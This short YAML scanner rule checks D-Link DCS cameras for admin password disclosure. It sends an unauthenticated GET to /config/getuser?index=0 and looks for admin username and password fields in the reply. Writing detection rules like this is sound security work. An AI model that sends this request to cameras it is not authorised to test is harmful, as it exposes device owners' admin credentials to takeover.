cve-id: dlink-dcs-password-disclosure
manual: true
transport: http
rules:
  - method: GET
    path: /config/getuser?index=0
    follow_redirects: false
    expression: |
      response.status == 200 && response.body.bcontains(b"name=admin") && response.body.bcontains(b"pass=") && response.body.bcontains(b"priv=")
severity:
  high
type:
  adminpassworddisclosure
